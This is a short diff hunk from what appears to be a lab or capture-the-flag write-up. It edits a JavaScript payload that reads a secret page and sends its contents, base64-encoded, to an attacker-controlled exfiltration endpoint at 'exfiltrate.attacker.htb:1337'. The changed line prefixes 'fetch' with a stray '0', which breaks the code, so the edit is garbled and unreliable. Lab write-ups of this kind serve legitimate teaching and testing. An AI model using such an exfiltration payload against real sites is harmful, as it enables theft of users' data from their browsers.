@@ -40,7 +40,7 @@ Finally, we need to host the following payload on our web server and start our e
         var xhr = new XMLHttpRequest();
         xhr.open('GET', 'http://www.attacker.htb/secret', true);
         xhr.onload = () => {
-          fetch('http://exfiltrate.attacker.htb:1337/log?data=' + btoa(xhr.response));
+          0fetch('http://exfiltrate.attacker.htb:1337/log?data=' + btoa(xhr.response));
         };
         xhr.send();
 
